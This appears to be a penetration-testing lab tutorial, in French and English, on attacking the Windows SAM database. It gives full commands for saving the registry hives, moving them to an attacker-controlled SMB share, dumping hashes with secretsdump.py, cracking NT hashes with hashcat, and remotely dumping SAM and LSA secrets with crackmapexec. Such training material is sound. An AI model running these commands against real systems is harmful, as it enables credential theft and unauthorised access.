# Attacking SAM

***

Sur un système Windows qui n'est pas membre d'un domaine, nous pouvons tenter de **récupérer rapidement les fichiers associés à la base de données SAM**.&#x20;

<mark style="color:orange;">**Copying SAM Registry Hives**</mark>

There are three registry hives that we can copy if we have local admin access on the target

{% hint style="info" %}
**`HKLM\SAM`** fait référence à une clé du **Registre Windows**, un endroit où sont stockées des informations critiques sur le système d’exploitation.

***

#### 🔹 **Décomposition :**

* **`HKLM`** : Abréviation de **HKEY\_LOCAL\_MACHINE**.
  * C'est une branche principale du registre qui contient des paramètres et configurations liés au **système** et à **tous les utilisateurs** de l’ordinateur.
  * Elle stocke des informations matérielles, logicielles et de sécurité.
* **`SAM`** : Abréviation de **Security Account Manager**.
  * C'est une sous-clé de `HKLM` qui contient les **informations d'authentification et de sécurité** (comptes utilisateurs, mots de passe hachés, SID, etc.).
{% endhint %}

<table data-full-width="true"><thead><tr><th>Registry Hive</th><th>Description</th></tr></thead><tbody><tr><td><code>hklm\sam</code></td><td>Contains the hashes associated with local account passwords. </td></tr><tr><td><code>hklm\system</code></td><td>Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.</td></tr><tr><td><code>hklm\security</code></td><td>Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.</td></tr></tbody></table>

<mark style="color:orange;">**Using reg.exe save to Copy Registry Hives**</mark>

```cmd-session
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

<mark style="color:orange;">**Creating a Share with smbserver.py**</mark>

{% code overflow="wrap" fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```
{% endcode %}

<mark style="color:orange;">**Moving Hive Copies to Share**</mark>

```cmd-session
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```

<mark style="color:orange;">**Confirming Hive Copies Transferred to Attack Host**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ ls

sam.save  security.save  system.save
```

***

### <mark style="color:blue;">Dumping Hashes with Impacket's secretsdump.py</mark>

<mark style="background-color:red;">**One incredibly useful tool we can use to dump the hashes offline is Impacket's**</mark><mark style="background-color:red;">**&#x20;**</mark><mark style="background-color:red;">**`secretsdump.py`**</mark><mark style="background-color:red;">**.**</mark>

<mark style="color:orange;">**Locating secretsdump.py**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ locate secretsdump 
```

Using secretsdump.py is a simple process. All we must do is run secretsdump.py using Python, then specify each hive file we retrieved from the target host.

<mark style="color:orange;">**Running secretsdump.py**</mark>

{% code overflow="wrap" fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
{% endcode %}

{% hint style="warning" %}
Here we see that secretsdump successfully dumps the `local` SAM hashes and would've also dumped the cached domain logon information if the target was domain-joined and had cached credentials present in hklm\security. Notice the first step secretsdump executes is targeting the `system bootkey` before proceeding to dump the `LOCAL SAM hashes`. It cannot dump those hashes without the boot key because that boot key is used to encrypt & decrypt the SAM database, which is why it is important for us to have copies of the registry hives we discussed earlier in this section.&#x20;
{% endhint %}

Notice at the top of the secretsdump.py output:

```shell-session
Dumping local SAM hashes (uid:rid:lmhash:nthash)
```

This tells us how to read the output and what hashes we can crack. <mark style="color:orange;">**Most modern Windows operating systems store the password as an NT hash.**</mark> Operating systems older than Windows Vista & Windows Server 2008 store passwords as an LM hash, so we may only benefit from cracking those if our target is an older Windows OS.

***

### <mark style="color:blue;">Cracking Hashes with Hashcat</mark>

<mark style="color:orange;">**Adding nthashes to a .txt File**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ sudo vim hashestocrack.txt

64f12cddaa88057e06a81b54e73b949b
```

Now that the NT hashes are in our text file (`hashestocrack.txt`), we can use Hashcat to crack them.

<mark style="color:orange;">**Running Hashcat against NT Hashes**</mark>

Selecting a mode is largely dependent on the type of attack and hash type we want to crack.&#x20;

Covering each mode is beyond the scope of this module. We will focus on using `-m` to select the hash type `1000` to crack our NT hashes (also referred to as NTLM-based hashes).&#x20;

We can refer to Hashcat's [wiki page](https://hashcat.net/wiki/doku.php?id=example_hashes)

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...
```
{% endcode %}

{% hint style="danger" %}
Keep in mind that this is a well-known technique, so admins may have safeguards to prevent and detect it. We can see some of these ways [documented](https://attack.mitre.org/techniques/T1003/002/) within the MITRE attack framework.
{% endhint %}

***

### <mark style="color:blue;">Remote Dumping & LSA Secrets Considerations</mark>

Avec un accès à des identifiants disposant de privilèges administrateur local, il est également possible de cibler les **LSA Secrets** à distance via le réseau. Cela pourrait nous permettre d’extraire des identifiants provenant d’un service en cours d’exécution, d’une tâche planifiée ou d’une application utilisant les **LSA Secrets** pour stocker des mots de passe.

<mark style="color:orange;">**Dumping LSA Secrets Remotely**</mark>

{% code overflow="wrap" fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```
{% endcode %}

<mark style="color:orange;">**Dumping SAM Remotely**</mark>

{% code overflow="wrap" fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```
{% endcode %}

Practice each technique taught in this section while you work to complete the challenge questions.
